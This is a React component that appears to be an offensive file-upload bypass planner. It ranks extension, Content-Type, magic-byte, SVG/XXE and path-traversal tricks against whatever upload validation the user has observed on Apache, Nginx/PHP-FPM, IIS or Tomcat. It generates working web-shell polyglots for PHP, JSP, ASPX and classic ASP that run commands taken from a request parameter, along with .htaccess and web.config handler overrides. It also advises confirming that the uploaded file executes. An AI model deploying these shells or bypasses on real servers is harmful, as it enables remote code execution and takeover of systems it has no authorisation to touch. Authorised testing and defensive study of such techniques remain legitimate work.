import { useMemo, useState } from 'react';
import { Callout, Card, Checkbox, KVTable, OutputBlock, SectionTitle, Select, TextInput } from '@/components/ui';

type Stack = 'apache' | 'fpm' | 'iis' | 'tomcat';
type CheckKey = 'client' | 'blacklist' | 'mime' | 'magic' | 'reencode' | 'rename';

const STACK_OPTIONS: Array<{ value: Stack; label: string }> = [
  { value: 'apache', label: 'Apache + mod_php' },
  { value: 'fpm', label: 'Nginx + PHP-FPM' },
  { value: 'iis', label: 'IIS + ASP.NET' },
  { value: 'tomcat', label: 'Tomcat' },
];

const EXT_OPTIONS = ['php', 'asp', 'aspx', 'jsp'].map((e) => ({ value: e, label: `.${e}` }));

const ALT_EXT: Record<string, string[]> = {
  php: ['.phtml', '.php5', '.php7', '.phar', '.pht', '.phps'],
  asp: ['.asa', '.cer', '.cdx', '.asp'],
  aspx: ['.ashx', '.asmx', '.asax', '.svc'],
  jsp: ['.jspx', '.jspf', '.jsw', '.jsv'],
};

const CHECKS: Array<{ key: CheckKey; label: string; description: string }> = [
  { key: 'client', label: 'Client-side only', description: 'accept= or JS validation, no server check' },
  { key: 'blacklist', label: 'Extension blacklist', description: 'Rejects .php/.asp/.jsp by name' },
  { key: 'mime', label: 'Content-Type check', description: 'Trusts the multipart part header' },
  { key: 'magic', label: 'Magic-byte check', description: 'getimagesize() or a file(1)-style sniff' },
  { key: 'reencode', label: 'Image re-encode', description: 'Decodes and re-saves the bitmap' },
  { key: 'rename', label: 'Server-side rename', description: 'Upload stored under a random name' },
];

interface Row {
  technique: string;
  filename: string;
  header: string;
  effect: string;
  defeats: CheckKey[];
}

function effectFor(stack: Stack, kind: string, ext: string): string {
  switch (kind) {
    case 'double':
      return stack === 'apache'
        ? 'Last extension wins for the handler map → treated as .jpg by mod_php but some maps use any match.'
        : stack === 'fpm'
          ? 'Static .jpg unless the FastCGI regex matches substrings; cgi.fix_pathinfo can route it to PHP.'
          : stack === 'iis'
            ? 'Served as an image; IIS maps by the final extension, so this is a miss.'
            : 'Served as static content unless a filter maps *.jpg to the JSP servlet.';
    case 'doubleRev':
      return stack === 'iis'
        ? 'Executes: IIS maps on the last dot, which is the script extension.'
        : 'Executes when the upload validator inspects the first extension only.';
    case 'trailingDot':
      return stack === 'iis'
        ? 'Windows strips the trailing dot before mapping → shell.asp executes while the check sees no match.'
        : 'Rejected or stored literally; Apache and Nginx do not strip the dot.';
    case 'ads':
      return stack === 'iis'
        ? 'NTFS alternate data stream is stripped, leaving shell.asp — the classic IIS bypass.'
        : 'No ADS support; the name is stored verbatim and will not execute.';
    case 'case':
      return stack === 'iis'
        ? 'Case-insensitive mapping → executes, and a case-sensitive blacklist misses it.'
        : 'Apache handler matching is case-insensitive on the extension → .pHp executes.';
    case 'nul':
      return 'Legacy PHP (< 5.3.4) and old JSP containers truncate at the null byte and execute the prefix.';
    case 'semicolon':
      return stack === 'iis'
        ? 'IIS maps everything before the semicolon → shell.asp executes, .jpg is ignored.'
        : 'Stored with the semicolon; most stacks will not execute it.';
    case 'altExt':
      return stack === 'tomcat'
        ? 'JSP servlet mappings cover *.jspx and *.jspf — both execute without a .jsp suffix.'
        : stack === 'fpm'
          ? 'Only the configured FastCGI regex (usually \\.php$) reaches PHP; .phtml/.php5 stay static unless mirrored.'
          : stack === 'iis'
            ? '.ashx/.asmx/.svc map to handlers and execute; .cer is static unless a handler is registered.'
            : `.${ext} sibling extensions execute when a handler covers them (AddHandler, SetHandler or the default mime map).`;
    case 'mime':
      return 'Server trusts the multipart Content-Type → an image/* part with executable content passes a MIME allow-list.';
    case 'magic':
      return 'A valid image header (GIF89a, %PDF-1.7, BM) in front of the payload satisfies getimagesize(); the trailing code still executes.';
    case 'htaccess':
      return stack === 'apache'
        ? 'Uploading .htaccess with AddType re-maps an arbitrary extension for that directory — no rename can undo it.'
        : 'Not honoured; Nginx, IIS and Tomcat ignore .htaccess.';
    case 'config':
      return stack === 'iis'
        ? 'A web.config in the upload directory can register a handler for any extension.'
        : 'Not honoured outside IIS.';
    case 'svg':
      return 'SVG is XML: external entities reach oast.example.com, and inline script runs when the file is served as image/svg+xml.';
    case 'traversal':
      return 'Path segments in the filename escape the upload directory when the name is joined without normalisation.';
    default:
      return 'Control request — establishes what the validator rejects before any bypass is attempted.';
  }
}

function polyglot(ext: string): string {
  if (ext === 'php') {
    return `GIF89a;\n<?php\n// GIF89a satisfies a magic-byte check; the parser ignores everything before <?php\nsystem($_GET['c'] ?? 'id');\n__halt_compiler();\n?>`;
  }
  if (ext === 'jsp') {
    return `GIF89a;\n<%\n// Same trick for a JSP container: the byte prefix passes an image sniff\nString c = request.getParameter("c");\nRuntime.getRuntime().exec(new String[]{"/bin/sh","-c", c == null ? "id" : c});\n%>`;
  }
  if (ext === 'aspx') {
    return `GIF89a;\n<%@ Page Language="C#" %>\n<%@ Import Namespace="System.Diagnostics" %>\n<script runat="server">\n  protected void Page_Load(object s, EventArgs e) {\n    var p = new ProcessStartInfo("cmd.exe", "/c " + (Request["c"] ?? "whoami"));\n    p.RedirectStandardOutput = true; p.UseShellExecute = false;\n    Response.Write(Process.Start(p).StandardOutput.ReadToEnd());\n  }\n</script>`;
  }
  return `GIF89a;\n<%\nSet o = Server.CreateObject("WScript.Shell")\nResponse.Write o.Exec("cmd.exe /c " & Request("c")).StdOut.ReadAll\n%>`;
}

export default function FileUploadBypassPlan() {
  const [stack, setStack] = useState<Stack>('fpm');
  const [ext, setExt] = useState('php');
  const [filename, setFilename] = useState('shell');
  const [checks, setChecks] = useState<Record<CheckKey, boolean>>({
    client: true,
    blacklist: true,
    mime: true,
    magic: false,
    reencode: false,
    rename: false,
  });

  const base = (filename.trim() || 'shell').replace(/\.[a-z0-9]+$/i, '');
  const alts = ALT_EXT[ext] ?? [];

  const rows = useMemo<Row[]>(() => {
    const altFilename = alts[1] ?? `.${ext}`;
    return [
      { technique: 'Control', filename: `${base}.${ext}`, header: 'application/octet-stream', effect: effectFor(stack, 'baseline', ext), defeats: [] },
      { technique: 'Double extension', filename: `${base}.${ext}.jpg`, header: 'image/jpeg', effect: effectFor(stack, 'double', ext), defeats: ['blacklist', 'mime'] },
      { technique: 'Reversed double', filename: `${base}.jpg.${ext}`, header: 'image/jpeg', effect: effectFor(stack, 'doubleRev', ext), defeats: ['blacklist'] },
      { technique: 'Trailing dot', filename: `${base}.${ext}.`, header: 'image/jpeg', effect: effectFor(stack, 'trailingDot', ext), defeats: ['blacklist'] },
      { technique: 'NTFS ADS', filename: `${base}.${ext}::$DATA`, header: 'image/jpeg', effect: effectFor(stack, 'ads', ext), defeats: ['blacklist'] },
      { technique: 'Case variant', filename: `${base}.${ext.charAt(0).toUpperCase()}${ext.slice(1).toLowerCase()}`, header: 'image/jpeg', effect: effectFor(stack, 'case', ext), defeats: ['blacklist'] },
      { technique: 'Null byte', filename: `${base}.${ext}%00.jpg`, header: 'image/jpeg', effect: effectFor(stack, 'nul', ext), defeats: ['blacklist'] },
      { technique: 'Semicolon', filename: `${base}.${ext};.jpg`, header: 'image/jpeg', effect: effectFor(stack, 'semicolon', ext), defeats: ['blacklist'] },
      { technique: 'Sibling extension', filename: `${base}${altFilename}`, header: 'image/jpeg', effect: effectFor(stack, 'altExt', ext), defeats: ['blacklist'] },
      { technique: 'Content-Type swap', filename: `${base}.${ext}`, header: 'image/gif', effect: effectFor(stack, 'mime', ext), defeats: ['mime'] },
      { technique: 'Magic-byte prefix', filename: `${base}.${ext}`, header: 'image/gif', effect: effectFor(stack, 'magic', ext), defeats: ['magic'] },
      { technique: '.htaccess override', filename: '.htaccess', header: 'text/plain', effect: effectFor(stack, 'htaccess', ext), defeats: ['blacklist'] },
      { technique: 'web.config', filename: 'web.config', header: 'text/xml', effect: effectFor(stack, 'config', ext), defeats: ['blacklist'] },
      { technique: 'SVG / XXE', filename: `${base}.svg`, header: 'image/svg+xml', effect: effectFor(stack, 'svg', ext), defeats: ['mime', 'magic'] },
      { technique: 'Path traversal', filename: `../../${base}.${ext}`, header: 'application/octet-stream', effect: effectFor(stack, 'traversal', ext), defeats: ['rename'] },
    ];
  }, [stack, ext, base, alts]);

  const observed = CHECKS.filter((c) => checks[c.key]).map((c) => c.key);
  const ranked = useMemo(() => {
    return rows
      .map((r) => {
        const hits = r.defeats.filter((d) => observed.includes(d));
        return { ...r, hits, priority: hits.length };
      })
      .sort((a, b) => b.priority - a.priority);
  }, [rows, observed]);

  const strongest = ranked.filter((r) => r.priority > 0).slice(0, 3);

  return (
    <>
      <Card title="Target and observed validation">
        <div className="grid gap-4 sm:grid-cols-2">
          <TextInput
            label="Upload endpoint"
            value={filename}
            onChange={setFilename}
            mono
            hint="Base filename only — the extension is chosen below"
          />
          <div className="grid grid-cols-2 gap-3">
            <Select label="Server-side extension" value={ext} onChange={setExt} options={EXT_OPTIONS} />
            <Select label="Stack" value={stack} onChange={setStack} options={STACK_OPTIONS} />
          </div>
        </div>
        <div className="mt-5 grid gap-3 sm:grid-cols-2 lg:grid-cols-3">
          {CHECKS.map((c) => (
            <div key={c.key} className="rounded border border-[var(--card-border)] px-3 py-2">
              <Checkbox
                checked={checks[c.key]}
                onChange={(v) => setChecks((prev) => ({ ...prev, [c.key]: v }))}
                label={c.label}
                description={c.description}
              />
            </div>
          ))}
        </div>
        <p className="mt-4 mb-0 text-[11.5px] leading-relaxed text-[var(--text-faint)]">
          Tick only what you have actually seen the server enforce. A client-side check is not a control — the request is
          replayed with a proxy, so every client-only row below is dead on arrival.
        </p>
      </Card>

      <Card title="Bypass matrix">
        <div className="-mx-2 overflow-x-auto px-2">
          <table className="w-full text-[12px]">
            <thead>
              <tr className="text-left text-[var(--text-faint)]">
                <th className="px-2 py-1.5 font-medium">Technique</th>
                <th className="px-2 py-1.5 font-medium">Filename / header</th>
                <th className="px-2 py-1.5 font-medium">Expected behaviour</th>
                <th className="px-2 py-1.5 font-medium">Defeats</th>
              </tr>
            </thead>
            <tbody>
              {ranked.map((r, i) => (
                <tr key={r.technique} className={i % 2 ? 'bg-[var(--neutral-btn)]' : ''}>
                  <td className="px-2 py-1.5 align-top text-[var(--text)]">{r.technique}</td>
                  <td className="rf-mono px-2 py-1.5 align-top break-all text-[11.5px] text-[var(--text-muted)]">
                    {r.filename}
                    <span className="mt-0.5 block text-[10.5px] text-[var(--text-faint)]">{r.header}</span>
                  </td>
                  <td className="px-2 py-1.5 align-top text-[11.5px] leading-snug text-[var(--text-muted)]">{r.effect}</td>
                  <td className="px-2 py-1.5 align-top">
                    {r.priority > 0 ? (
                      <span className="rf-mono rounded px-1.5 py-0.5 text-[10.5px] font-semibold" style={{ color: 'var(--accent)', background: 'var(--neutral-btn)' }}>
                        {r.hits.join(' + ')}
                      </span>
                    ) : (
                      <span className="rf-mono text-[10.5px] text-[var(--text-faint)]">no control</span>
                    )}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </Card>

      <Card title="Payload skeleton">
        <SectionTitle>Polyglot for .{ext} on {STACK_OPTIONS.find((s) => s.value === stack)?.label}</SectionTitle>
        <OutputBlock value={polyglot(ext)} rows={10} label={`${base}.${ext}`} />
        <div className="mt-4">
          <SectionTitle>Override the parser</SectionTitle>
          <OutputBlock
            value={
              stack === 'apache'
                ? `# .htaccess in the upload directory — needs AllowOverride FileInfo\nAddType application/x-httpd-php .rce\nAddHandler application/x-httpd-php .rce\n# then upload ${base}.rce`
                : stack === 'iis'
                  ? `<?xml version="1.0" encoding="UTF-8"?>\n<configuration>\n  <system.webServer>\n    <handlers accessPolicy="Read, Script">\n      <add name="rce" path="*.rce" verb="*" modules="IsapiModule"\n           scriptProcessor="C:\\Windows\\System32\\inetsrv\\asp.dll" resourceType="File" />\n    </handlers>\n  </system.webServer>\n</configuration>`
                  : `# No per-directory override on this stack.\n# Look instead at the FastCGI/connector regex and the mime map in the vhost config:\nlocation ~ \\.(php|phtml|php5)$ { fastcgi_pass 127.0.0.1:9000; }`
            }
            label=".htaccess / web.config"
            rows={8}
          />
        </div>
      </Card>

      <Card title="What to check after upload">
        <KVTable
          rows={[
            ['Best candidates', strongest.length ? strongest.map((r) => r.technique).join(' → ') : 'none — no ticked control is bypassed by this matrix'],
            ['Retrieval', `curl -i "https://example.com/uploads/${base}.${ext}" and compare Content-Type with the stored part`],
            ['Rename check', 'Upload twice with the same name; if the second 200s under the same path, no rename happened'],
            ['Re-encode check', 'Upload a 1×1 GIF with the payload appended; if the served bytes shrink, the bitmap was re-encoded'],
            ['Second-order', 'Check thumbnails, previews and virus-scan workers — they often fetch the file by URL'],
          ]}
        />
        <div className="mt-4">
          <Callout tone="warn" title="Validate the execution, not the upload">
            A 200 on the upload proves storage only. Request the stored path, confirm the response body is the command
            output, and record that exact URL as evidence. If the body is the source code, the file was stored but not
            executed — try the sibling extensions next.
          </Callout>
        </div>
      </Card>
    </>
  );
}
